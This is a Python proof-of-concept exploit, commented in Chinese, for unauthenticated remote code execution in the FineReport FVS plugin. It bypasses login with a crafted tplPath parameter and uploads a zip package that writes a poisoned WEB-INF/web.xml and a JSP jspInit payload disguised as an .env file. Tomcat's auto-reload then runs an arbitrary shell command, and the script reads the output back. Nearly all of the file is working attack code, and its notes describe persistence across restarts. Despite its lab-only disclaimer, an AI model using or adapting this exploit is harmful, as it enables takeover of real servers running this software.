#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FineReport FVS 插件未授权 RCE PoC —— 路线二：附件层 web.xml 投毒（应用由 Tomcat 管理时全自动）
=================================================================================
配套: poc-h2.py(路线一: H2 数据连接层注入; 其 --implant 为全自动版) | 原理见 vulnerability-analysis.md

链路:
  tplPath=reportlets 绕过登录校验
  → 未授权上传复用包 → 未授权 apply
  → 附件层按包内清单 AttachmentLayer.json 写文件（WorkResource 根 = WEB-INF）
     · WEB-INF/web.xml = 投毒部署描述符（<jsp-file> 指向 WEB-INF/x.env + <load-on-startup>）
     · WEB-INF/x.env   = jspInit 声明块（.env 后缀过 FileSecurityChecker 白名单）
  → Tomcat 对"由它自己管理"的应用会监听 WEB-INF/web.xml, 一变就自动重载(实测 5–8 秒)
    → Jasper 预编译该 JSP → 生成 servlet 初始化 → jspInit() 自动执行
    → 命令以应用进程权限运行, 输出写回 webroot → GET 静态文件回显
    （执行时不需要对目标发起任何触发请求, 命令在写入时固化）

说明(实验基线: 插件 4.13.0 + 官方 ops 镜像):
  全自动的条件是"应用由 Tomcat 自己管理"(放在 webapps 下自动部署, 或由
  conf/Catalina/localhost/ 下的描述符部署)——Tomcat 会监听这类应用的 WEB-INF/web.xml。
  实测: 写入后 5–8 秒触发重载, 约 50–63 秒后命令执行, 无需重启, 无触发请求。
  官方 ops 镜像例外: /webroot 被直接写在 server.xml 里且 appBase="none", Tomcat 不监听它的
  web.xml(开 reloadable 也只监听 classes/lib)。在这种部署上本脚本只完成植入, 需等重启/重部署;
  或先用 poc-h2.py --implant 写一个上下文描述符, 应用即转为 Tomcat 管理, 之后本脚本全自动。

条件: 目标为 Linux(命令经 /bin/sh 执行); FR 进程对 Tomcat 目录有写权限(官方镜像以 root 运行)。

仅用于授权测试 / 自建靶场。禁止指向生产或他人资产。

用法:
  python3 poc-attach.py -t http://127.0.0.1:18081                 # 默认命令: 落地标记, 等待自动重载并回读
  python3 poc-attach.py -t http://127.0.0.1:18081 -c "id"         # 自定义命令(写入时固化)
  python3 poc-attach.py -t http://127.0.0.1:18081 --wait 300      # 等自动重载执行的最长秒数
说明: FR 本体无自带 web.xml（servlet 走注解注册），新写入的 web.xml 不含
      metadata-complete，不影响 FR 原有功能。还原 = 删除 WEB-INF/web.xml 与
      WEB-INF/x.env 后重启。
"""
import argparse
import http.client
import io
import json
import sys
import time
import urllib.parse
import zipfile

WEBXML = '''<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
  <servlet>
    <servlet-name>xs</servlet-name>
    <jsp-file>/WEB-INF/x.env</jsp-file>
    <load-on-startup>1</load-on-startup>
  </servlet>
</web-app>
'''


def make_jsp_init(cmd: str) -> str:
    """jspInit 声明块：<jsp-file>+<load-on-startup> 使容器重载预编译时自动执行。"""
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return ('<%! public void jspInit() {\n'
            '  try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",'
            '"' + esc + '"}).waitFor(); } catch (Throwable t) {}\n'
            '} %>')


def build_pack(jsp_env: str) -> bytes:
    """复用包（zip）。关键结构（全部实测校准）:
    · 实体 info 文件名必须是 bizEntityInfo.json（小写 b），type 取不匹配值跳过 analyzer
    · AttachmentLayer.json 的 exportPath 相对 content/biz/attachments/ 目录
    · originPath 相对 WEB-INF（.env/.xml 过 FileSecurityChecker 白名单, .jsp 拒）"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("resource/info.xml",
                   '<?xml version="1.0" encoding="UTF-8"?>\n<ITEM>\n<structureVersion>2.0'
                   '</structureVersion>\n<name>apwn</name>\n<entityType>fvs</entityType>'
                   '\n<envVersion>11.0</envVersion>\n</ITEM>\n')
        z.writestr("content/biz/BizLayer.json",
                   '{"entityMappings":[{"uuid":"e1","id":"reportlets/apwn/main.fvs"}],'
                   '"staticInfos":[],"attachInfos":[]}')
        z.writestr("content/biz/e1/bizEntityInfo.json", '{"id":"e1","type":99}')
        z.writestr("content/biz/e1/mainContentFileName.fvs", '{"widgets":[],"version":"1.0"}')
        z.writestr("content/data/DataLayer.json",
                   '{"tableInfos":[],"staticInfos":[],"attachInfos":[]}')
        z.writestr("content/biz/attachments/web.xml", WEBXML)      # → WEB-INF/web.xml
        z.writestr("content/biz/attachments/x.env", jsp_env)       # → WEB-INF/x.env
        z.writestr("content/biz/attachments/AttachmentLayer.json", json.dumps({
            "attachInfos": [
                {"exportPath": "web.xml", "originPath": "web.xml"},
                {"exportPath": "x.env", "originPath": "x.env"},
            ],
            "staticInfos": [],
        }))
    return buf.getvalue()


def req(urlp, method="GET", body=None, ctype=None, timeout=60):
    conn = http.client.HTTPConnection(urlp.hostname, urlp.port or 80, timeout=timeout)
    conn.request(method, urlp.path + (("?" + urlp.query) if urlp.query else ""),
                 body=body, headers={"Content-Type": ctype} if ctype else {})
    r = conn.getresponse()
    data = r.read()
    conn.close()
    return r.status, data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", required=True, help="引擎基址, 如 http://ip:18081")
    ap.add_argument("-c", "--cmd", default=None, help="要执行的命令(写入时固化, 默认写标记)")
    ap.add_argument("--wait", type=int, default=180, help="等待重载生效的最长秒数")
    a = ap.parse_args()

    base = a.target.rstrip("/")
    o = urllib.parse.urlsplit(base)
    origin = f"{o.scheme}://{o.netloc}"
    readback = f"{origin}/webroot/attach_poc_readback.txt"
    if a.cmd:
        cmd = f"( {a.cmd} ) > /usr/local/tomcat/webapps/webroot/attach_poc_readback.txt 2>&1"
    else:
        cmd = (f"(echo PWN-ATTACH-LAYER-RCE; id; hostname; date) > "
               f"/usr/local/tomcat/webapps/webroot/attach_poc_readback.txt 2>&1")

    # ---- 1) 未授权上传复用包（命令已固化进 jspInit）----
    props = json.dumps({"name": "apwn", "structureVersion": "2.0", "envVersion": "11.0"})
    qs = ("tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props="
          + urllib.parse.quote(props, safe=""))
    b = "----poc114516"
    body = (f"--{b}\r\n".encode()
            + b'Content-Disposition: form-data; name="file"; filename="p.mfvs"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + build_pack(make_jsp_init(cmd))
            + f"\r\n--{b}--\r\n".encode())
    st, data = req(urllib.parse.urlsplit(
        f"{base}/webroot/decision/view/duchamp/reuse/item?{qs}"), "POST", body,
        f"multipart/form-data; boundary={b}")
    rid = json.loads(data).get("id", "") if st == 200 else ""
    print(f"[1] upload  -> {st}  id={rid}")
    if not rid:
        print("    上传失败:", data[:200]); sys.exit(1)

    # ---- 2) 未授权 apply：附件层此刻已写入 WEB-INF/web.xml 与 WEB-INF/x.env ----
    q = urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": "apwnout"})
    st2, d2 = req(urllib.parse.urlsplit(
        f"{base}/webroot/decision/view/duchamp/reuse/apply/v2/tpl?{q}"), "POST", b"", timeout=120)
    print(f"[2] apply   -> {st2}  {d2[:110].decode('utf-8', 'replace')}")
    print("    （WEB-INF/web.xml + WEB-INF/x.env 已落盘, 命令已固化进 jspInit）")

    # ---- 3) 等待: Tomcat 发现 web.xml 变化后自动重载, jspInit 执行, 回读文件出现即完成 ----
    print(f"[3] 等待 Tomcat 自动重载并执行(最长 {a.wait}s, 每 6s 探测回读文件)...")
    deadline = time.time() + a.wait
    armed = False
    while time.time() < deadline:
        try:
            stp, dp = req(urllib.parse.urlsplit(readback), timeout=8)
            if stp == 200 and dp.strip():
                armed = True
                print("    命令已执行（无需任何触发请求）:")
                print("-" * 46)
                print(dp.decode("utf-8", "replace").strip())
                print("-" * 46)
                break
        except Exception:
            pass
        time.sleep(6)
    if not armed:
        print("    超时: 期间没有发生重载。该应用很可能被直接写在 server.xml 里(如官方 ops 镜像),")
        print("          Tomcat 不监听它的 web.xml(见文件头'说明')。")
        print("    web.xml 已投毒——任何一次重启/发版/重部署, jspInit 将在启动时自动执行。")
        print("    想自动触发: 用 poc-h2.py --implant 写一个上下文描述符, 之后本脚本即可全自动。")
        sys.exit(2)
    print("[*] 完成。")

if __name__ == "__main__":
    main()
